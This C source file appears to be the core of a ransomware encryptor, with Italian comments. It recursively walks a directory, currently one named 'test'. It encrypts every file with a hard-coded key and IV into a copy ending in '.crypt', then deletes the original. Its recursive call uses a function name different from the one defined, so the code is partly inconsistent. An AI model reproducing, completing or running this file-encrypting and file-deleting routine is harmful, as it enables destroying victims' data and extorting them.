#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>

#include "lib/crypt.h"
#include "lib/function.h"

#define DEBUG

char* iv = "qwertyuiopasd";
char* key = "asdfghjklzxcvbnmqwertyuiopasdfgh";
char* ext = ".crypt";

int VisitCrypt(char* path);

int main(int argc, char const *argv[]) {
  char* path = "test";
  VisitCrypt(path);
  return 0;
}

int VisitCrypt(char* path){
  struct dirent *de;
  DIR *dr = opendir(path);
  //passo base
  if(dr == NULL){
    #ifdef DEBUG
    printf("%s è un file\n", path);
    #endif
    return 0;
  }

  char *newName, *toVisit;
  FILE *old, *nuovo;

  while((de=readdir(dr)) != NULL){
    if(strcmp(de->d_name,".") != 0 && strcmp(de->d_name,"..") != 0 && strstr(de->d_name,".crypt") == NULL){
      #ifdef DEBUG
      printf("VISITO %s CHE CONTIENE %s\n", path, de->d_name);
      #endif
      toVisit = linkStr(path, de->d_name, 1);
      //passo ricorsivo
      if(Visit(toVisit) == 0){
        newName = linkStr(toVisit,ext,0);
        old = fopen(toVisit, "rb");
        nuovo = fopen(newName, "wb");
        encrypt(old,nuovo,key,iv);
        deleteFile(toVisit);
        fclose(old);
        fclose(nuovo);
        free(newName);
      }
      free(toVisit);
    }
  }
  closedir(dr);
  return 1;
}
